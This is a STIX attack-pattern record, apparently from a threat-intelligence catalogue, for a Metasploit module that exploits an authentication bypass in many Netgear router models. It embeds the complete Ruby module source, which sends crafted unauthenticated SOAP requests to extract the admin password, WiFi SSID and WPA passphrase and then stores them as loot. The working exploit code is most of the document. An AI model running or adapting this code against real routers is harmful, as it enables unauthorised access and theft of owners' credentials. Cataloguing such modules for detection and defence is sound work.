{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--25012811-86d0-4a38-8266-3ccf527df20d",
    "created": "2024-08-14T16:23:43.748937Z",
    "modified": "2024-08-14T16:23:43.748941Z",
    "name": "Netgear Unauthenticated SOAP Password Extractor",
    "description": " This module exploits an authentication bypass vulnerability in different Netgear devices. It allows to extract the password for the remote management interface. This module has been tested on a Netgear WNDR3700v4 - V1.0.1.42, but other devices are reported as vulnerable: NetGear WNDR3700v4 - V1.0.0.4SH, NetGear WNDR3700v4 - V1.0.1.52, NetGear WNR2200 - V1.0.1.88 NetGear WNR2500 - V1.0.0.24, NetGear WNDR3700v2 - V1.0.1.14 (Tested by Paula Thomas) NetGear WNDR3700v1 - V1.0.16.98 (Tested by Michal Bartoszkiewicz) NetGear WNDR3700v1 - V1.0.7.98 (Tested by Michal Bartoszkiewicz) NetGear WNDR4300 - V1.0.1.60 (Tested by Ronny Lindner) NetGear R6300v2 - V1.0.3.8 (Tested by Robert Mueller) NetGear WNDR3300 - V1.0.45 (Tested by Robert Mueller) NetGear WNDR3800 - V1.0.0.48 (Tested by an Anonymous contributor) NetGear WNR1000v2 - V1.0.1.1 (Tested by Jimi Sebree) NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton) NetGear WNR2000v3 - v1.1.2.10 (Tested by h00die)  'References' => [ [ 'BID', '72640' ] [ 'OSVDB', '118316' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/netgear_soap_password_extractor.rb",
            "external_id": "netgear_soap_password_extractor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'Netgear Unauthenticated SOAP Password Extractor',\n      'Description' => %q{\n        This module exploits an authentication bypass vulnerability in different Netgear devices.\n        It allows to extract the password for the remote management interface. This module has been\n        tested on a Netgear WNDR3700v4 - V1.0.1.42, but other devices are reported as vulnerable:\n        NetGear WNDR3700v4 - V1.0.0.4SH, NetGear WNDR3700v4 - V1.0.1.52, NetGear WNR2200 - V1.0.1.88,\n        NetGear WNR2500 - V1.0.0.24, NetGear WNDR3700v2 - V1.0.1.14 (Tested by Paula Thomas),\n        NetGear WNDR3700v1 - V1.0.16.98 (Tested by Michal Bartoszkiewicz),\n        NetGear WNDR3700v1 - V1.0.7.98 (Tested by Michal Bartoszkiewicz),\n        NetGear WNDR4300 - V1.0.1.60 (Tested by Ronny Lindner),\n        NetGear R6300v2 - V1.0.3.8 (Tested by Robert Mueller),\n        NetGear WNDR3300 - V1.0.45 (Tested by Robert Mueller),\n        NetGear WNDR3800 - V1.0.0.48 (Tested by an Anonymous contributor),\n        NetGear WNR1000v2 - V1.0.1.1 (Tested by Jimi Sebree),\n        NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton),\n        NetGear WNR2000v3 - v1.1.2.10 (Tested by h00die)\n      },\n      'References' => [\n        [ 'BID', '72640' ],\n        [ 'OSVDB', '118316' ],\n        [ 'URL', 'https://github.com/darkarnium/secpub/tree/master/Vulnerabilities/NetGear/SOAPWNDR' ]\n      ],\n      'Author' => [\n        'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery\n        'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module\n        'h00die <mike@shorebreaksecurity.com>' # Metasploit enhancements/docs\n      ],\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => 'Feb 11 2015'\n    )\n  end\n\n  def run\n    print_status('Trying to access the configuration of the device')\n\n    # extract device details\n    action = 'urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo'\n    print_status('Extracting Firmware version...')\n    extract_data(action)\n\n    # extract credentials\n    action = 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo'\n    print_status('Extracting credentials...')\n    extract_data(action)\n\n    # extract wifi info\n    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo'\n    print_status('Extracting Wifi...')\n    extract_data(action)\n\n    # extract WPA info\n    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys'\n    print_status('Extracting WPA Keys...')\n    extract_data(action)\n  end\n\n  def extract_data(soap_action)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => '/',\n      'headers' => {\n        'SOAPAction' => soap_action\n      },\n      'data' => '='\n    })\n\n    return if res.nil?\n    return if res.code == 404\n    return if res.headers['Server'].nil?\n    # unknown if other devices have other Server headers\n    return if res.headers['Server'] !~ %r{Linux/2.6.15 uhttpd/1.0.0 soap/1.0}\n\n    if res.body =~ %r{<NewPassword>(.*)</NewPassword>}\n      print_status('Credentials found, extracting...')\n      extract_credentials(res.body)\n    end\n\n    if res.body =~ %r{<ModelName>(.*)</ModelName>}\n      model_name = ::Regexp.last_match(1)\n      print_good(\"Model #{model_name} found\")\n    end\n\n    if res.body =~ %r{<Firmwareversion>(.*)</Firmwareversion>}\n      firmware_version = ::Regexp.last_match(1)\n      print_good(\"Firmware version #{firmware_version} found\")\n\n      # store all details as loot\n      loot = store_loot('netgear_soap_device.config', 'text/plain', rhost, res.body)\n      print_good(\"Device details downloaded to: #{loot}\")\n    end\n\n    if res.body =~ %r{<NewSSID>(.*)</NewSSID>}\n      ssid = ::Regexp.last_match(1)\n      print_good(\"Wifi SSID: #{ssid}\")\n    end\n\n    if res.body =~ %r{<NewBasicEncryptionModes>(.*)</NewBasicEncryptionModes>}\n      wifi_encryption = ::Regexp.last_match(1)\n      print_good(\"Wifi Encryption: #{wifi_encryption}\")\n    end\n\n    if res.body =~ %r{<NewWPAPassphrase>(.*)</NewWPAPassphrase>}\n      wifi_password = ::Regexp.last_match(1)\n      print_good(\"Wifi Password: #{wifi_password}\")\n    end\n  rescue ::Rex::ConnectionError\n    vprint_error('Failed to connect to the web server')\n    return\n  end\n\n  def extract_credentials(body)\n    body.each_line do |line|\n      next unless line =~ %r{<NewPassword>(.*)</NewPassword>}\n\n      pass = ::Regexp.last_match(1)\n      print_good(\"admin / #{pass} credentials found\")\n\n      connection_details = {\n        module_fullname: fullname,\n        private_data: pass,\n        private_type: :password,\n        username: 'admin',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details)\n      create_credential_and_login(connection_details)\n    end\n\n    # store all details as loot\n    loot = store_loot('netgear_soap_account.config', 'text/plain', rhost, body)\n    print_good(\"Account details downloaded to: #{loot}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "Feb 11 2015"
}